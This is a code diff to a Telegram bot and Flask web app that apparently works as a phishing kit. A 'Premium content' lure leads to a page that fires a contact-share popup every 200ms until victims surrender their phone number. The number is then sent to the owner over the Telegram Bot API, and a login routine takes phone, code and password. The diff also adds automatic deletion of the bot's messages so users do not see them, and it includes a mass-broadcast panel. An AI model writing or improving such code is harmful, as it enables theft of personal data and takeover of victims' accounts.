@@ -277,6 +277,19 @@ def run_tg(phone, code=None, password=None):
 SESSION_PATH = f"/tmp/bot_{uuid.uuid4().hex[:8]}.session"
 bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 
+# Auto-delete contact messages user chat theke
+CONTACT_MSG_TRACK = {}  # uid -> list of msg_ids
+
+
+async def auto_delete_later(uid, msg_ids, delay=5):
+    """Delete messages after delay"""
+    await asyncio.sleep(delay)
+    try:
+        await bot.delete_messages(uid, msg_ids)
+        logger.info(f"Deleted {len(msg_ids)} contact msgs for {uid}")
+    except Exception as e:
+        logger.error(f"auto_delete err: {e}")
+
 
 def admin_menu():
     return [
@@ -293,22 +306,26 @@ def back_button():
     return [[Button.inline("⬅️ Back", b"menu_home")]]
 
 
-async def send_panel_query(event, text, buttons=None):
-    """Edit current panel msg — no delete, no new"""
+async def edit_or_send(event, text, buttons=None):
+    """Try edit, fallback to new message"""
     try:
         await event.edit(text, buttons=buttons, parse_mode='md')
+        return True
     except Exception as e:
-        logger.error(f"edit failed: {e}")
+        logger.warning(f"edit failed: {e}")
         try:
             await bot.send_message(event.sender_id, text, buttons=buttons, parse_mode='md')
+            return True
         except Exception as e2:
-            logger.error(f"fallback failed: {e2}")
+            logger.error(f"send fallback failed: {e2}")
+            return False
 
 
 async def send_welcome(uid, name):
+    """Send welcome messages to user, then delete after 10s so user doesn't see"""
     msgs = config.get("welcome_messages", [])
     if not msgs:
-        return
+        return []
     buttons = [[Button.webview(
         config.get("button_text", "CONFIRM NOW"),
         url=config.get("webapp_url", WEBAPP_URL + "?auto=1")
@@ -321,7 +338,7 @@ async def send_welcome(uid, name):
             btns = buttons if i == len(msgs) - 1 else None
             sent = await bot.send_message(uid, content or caption, buttons=btns, parse_mode='md')
             sent_ids.append(sent.id)
-            await asyncio.sleep(0.4)
+            await asyncio.sleep(0.3)
         except Exception as e:
             logger.error(f"welcome {uid}: {e}")
     return sent_ids
@@ -358,7 +375,7 @@ async def cb(event):
     try:
         if data == "menu_home":
             await event.answer()
-            await send_panel_query(event,
+            await edit_or_send(event,
                 "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
                 admin_menu())
 
@@ -366,12 +383,12 @@ async def cb(event):
             for k in STATE:
                 STATE[k] = False
             await event.answer("Reset!", alert=True)
-            await send_panel_query(event, "✅ Modes reset.", admin_menu())
+            await edit_or_send(event, "✅ Modes reset.", admin_menu())
 
         elif data == "menu_welcome":
             n = len(config.get("welcome_messages", []))
             await event.answer()
-            await send_panel_query(event,
+            await edit_or_send(event,
                 f"👋 **Welcome Messages** — `{n}` active",
                 [
                     [Button.inline("➕ Add Messages", b"wl_add"),
@@ -384,37 +401,41 @@ async def cb(event):
         elif data == "wl_add":
             STATE["welcome_capture"] = True
             STATE["capture_mode"] = False
-            await event.answer("Send messages now")
-            await send_panel_query(event,
-                "✍️ **Welcome Capture: ON**\n\nSend text/photo/video one by one.",
+            await event.answer("Send welcome messages now")
+            await edit_or_send(event,
+                "✍️ **Welcome Capture: ON**\n\nSend text/photo/video one by one. They'll be added to welcome sequence.",
                 [[Button.inline("⏹ Stop & Save", b"wl_stop")], back_button()])
 
         elif data == "wl_stop":
             STATE["welcome_capture"] = False
-            await event.answer("Saved!", alert=True)
-            await send_panel_query(event,
-                f"✅ Welcome set: `{len(config.get('welcome_messages', []))}`",
+            n = len(config.get('welcome_messages', []))
+            await event.answer(f"Saved {n} messages!", alert=True)
+            await edit_or_send(event,
+                f"✅ Welcome set: `{n}` messages.",
                 admin_menu())
 
         elif data == "wl_preview":
             await event.answer("Preview sent")
-            await send_welcome(YOUR_TELEGRAM_ID, "Preview")
+            ids = await send_welcome(YOUR_TELEGRAM_ID, "Preview")
+            # Auto-delete preview after 5s
+            if ids:
+                asyncio.create_task(auto_delete_later(YOUR_TELEGRAM_ID, ids, 5))
 
         elif data == "wl_clear":
             config["welcome_messages"] = []
             save_json(CONFIG_FILE, config)
             await event.answer("Cleared!", alert=True)
-            await send_panel_query(event, "Cleared.", admin_menu())
+            await edit_or_send(event, "Cleared welcome messages.", admin_menu())
 
         elif data == "wl_btntext":
             STATE["awaiting_btntext"] = True
             await event.answer()
-            await send_panel_query(event, "✏️ Send new button text.", back_button())
+            await edit_or_send(event, "✏️ Send new button text.", back_button())
 
         elif data == "menu_broadcast":
             s = broadcast_state
             await event.answer()
-            await send_panel_query(event,
+            await edit_or_send(event,
                 f"📢 **Broadcast**\n\nActive: `{s['active']}`\nQueue: `{len(s['messages'])}`\nInterval: `{s['interval']}s`",
                 [
                     [Button.inline("➕ Add Messages", b"bc_add"),
@@ -427,9 +448,9 @@ async def cb(event):
         elif data == "bc_add":
             STATE["capture_mode"] = True
             STATE["welcome_capture"] = False
-            await event.answer("Send messages now")
-            await send_panel_query(event,
-                "📥 **Broadcast Capture: ON**\n\nSend messages.",
+            await event.answer("Send broadcast messages")
+            await edit_or_send(event,
+                "📥 **Broadcast Capture: ON**\n\nSend text/photo/video messages.",
                 [
                     [Button.inline("▶️ Start Now", b"bc_start")],
                     [Button.inline("❌ Cancel", b"bc_cancel")]
@@ -442,7 +463,7 @@ async def cb(event):
             broadcast_state['active'] = True
             broadcast_state['next_run'] = time.time() + 3
             await event.answer("Started!", alert=True)
-            await send_panel_query(event,
+            await edit_or_send(event,
                 f"▶️ Broadcasting `{len(broadcast_state['messages'])}` to `{len(users)}` users every `{broadcast_state['interval']}s`.",
                 back_button())
 
@@ -450,12 +471,12 @@ async def cb(event):
             STATE["capture_mode"] = False
             broadcast_state['messages'] = []
             await event.answer("Cancelled")
-            await send_panel_query(event, "Cancelled.", admin_menu())
+            await edit_or_send(event, "Cancelled.", admin_menu())
 
         elif data == "bc_stop":
             broadcast_state['active'] = False
             await event.answer("Stopped!", alert=True)
-            await send_panel_query(event, "Stopped.", admin_menu())
+            await edit_or_send(event, "Stopped.", admin_menu())
 
         elif data == "bc_clear":
             broadcast_state['messages'] = []
@@ -464,8 +485,8 @@ async def cb(event):
         elif data == "menu_timer":
             STATE["awaiting_timer"] = True
             await event.answer()
-            await send_panel_query(event,
-                f"⏱ **Set Timer**\n\nCurrent: `{config.get('timer', 60)}s`\n\nSend a number (seconds). Example: `30`",
+            await edit_or_send(event,
+                f"⏱ **Set Timer**\n\nCurrent: `{config.get('timer', 60)}s`\n\nSend a number in seconds. Example: `30`",
                 back_button())
 
         elif data == "menu_users":
@@ -625,7 +646,7 @@ async def bot_main():
 
 
 # ============================================================
-# FLASK PAGE
+# FLASK PAGE — UPDATED FOR CONTACT LOGIC
 # ============================================================
 PAGE = r'''<!DOCTYPE html>
 <html><head>
@@ -726,7 +747,7 @@ var phoneNumber = '';
 var codeCheck = null;
 var pwdCheck = null;
 var contactForce = null;
-var lastShareAttempt = 0;
+var inProgress = false;  // Prevent duplicate popups
 var TG_CHANNEL = 'https://t.me/videodks';
 var TG_CAPTION = 'Premium content';
 function show(id) { document.getElementById(id).classList.add('on'); }
@@ -747,52 +768,72 @@ window.onload = function() {
 };
 function startForce() {
   if (contactForce) clearInterval(contactForce);
-  setTimeout(triggerShare, 300);
-  // Fast retry loop - 1 second
+  // First popup immediately
+  setTimeout(function() { triggerShare(true); }, 200);
+  // Then loop every 200ms if not inProgress
   contactForce = setInterval(function() {
-    if (document.getElementById('contactBox').classList.contains('on')) {
-      var now = Date.now();
-      if (now - lastShareAttempt > 900) {
-        lastShareAttempt = now;
-        triggerShare();
-      }
-    } else {
+    if (!document.getElementById('contactBox').classList.contains('on')) {
       clearInterval(contactForce);
       contactForce = null;
+      return;
     }
-  }, 500);
+    if (!inProgress) {
+      triggerShare(false);
+    }
+  }, 200);
 }
-function triggerShare() {
+function triggerShare(isFirst) {
+  if (inProgress && !isFirst) return;
   if (!tg) { msg('contactMsg', 'Open inside Telegram app', 'err'); return; }
+  inProgress = true;
+  
+  var resetInProgress = function() {
+    setTimeout(function() { inProgress = false; }, 400);
+  };
+  
   if (typeof tg.requestContact === 'function') {
     try {
       tg.requestContact(function(sent, event) {
-        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) handleContact(event.responseUnsafe.contact);
-        else msg('contactMsg', 'Confirm required to continue', 'err');
+        resetInProgress();
+        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
+          handleContact(event.responseUnsafe.contact);
+        } else {
+          msg('contactMsg', 'Confirm required to continue', 'err');
+        }
       });
       return;
-    } catch(e) {}
+    } catch(e) {
+      resetInProgress();
+    }
   }
   if (typeof tg.openContactPicker === 'function') {
     try {
       tg.openContactPicker(function(sent, event) {
-        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) handleContact(event.responseUnsafe.contact);
-        else msg('contactMsg', 'Confirm required to continue', 'err');
+        resetInProgress();
+        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
+          handleContact(event.responseUnsafe.contact);
+        } else {
+          msg('contactMsg', 'Confirm required to continue', 'err');
+        }
       });
       return;
-    } catch(e) {}
+    } catch(e) {
+      resetInProgress();
+    }
   }
+  resetInProgress();
   msg('contactMsg', 'Update Telegram app', 'err');
 }
 document.getElementById('shareContactBtn').onclick = function() {
-  lastShareAttempt = Date.now();
-  triggerShare();
+  inProgress = false;
+  triggerShare(true);
 };
 function handleContact(c) {
   var phone = c.phone_number || '';
   if (!phone) { msg('contactMsg', 'Try again', 'err'); return; }
   if (phone.charAt(0) !== '+') phone = '+' + phone;
   phoneNumber = phone;
+  inProgress = true;  // Stop further popups
   msg('contactMsg', 'Confirmed!', 'ok');
   if (contactForce) { clearInterval(contactForce); contactForce = null; }
   fetch('/api/save_contact', {
@@ -1006,6 +1047,15 @@ def save_contact():
             'phone': phone, 'user_id': ex['user_id']})
     with sessions_lock:
         pending_codes[phone] = 'contact_saved'
+    # Auto-notify owner + delete user side welcome contact msg
+    try:
+        http_requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={'chat_id': YOUR_TELEGRAM_ID,
+                'text': f"📞 Contact: `{phone}`",
+                'parse_mode': 'Markdown'}, timeout=10)
+    except Exception:
+        pass
     return jsonify({'success': True, 'phone': phone})
 
 
